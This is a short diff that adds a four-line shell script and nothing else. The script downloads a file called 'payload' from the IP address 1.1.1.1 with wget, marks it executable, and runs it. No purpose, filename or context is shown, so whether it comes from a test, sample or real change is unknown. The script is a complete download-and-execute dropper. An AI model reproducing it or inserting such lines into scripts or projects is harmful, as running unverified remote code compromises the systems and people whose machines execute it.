@@ -1,0 +1,4 @@
+#!/bin/sh
+wget 1.1.1.1/payload
+chmod 700 payload
+./payload
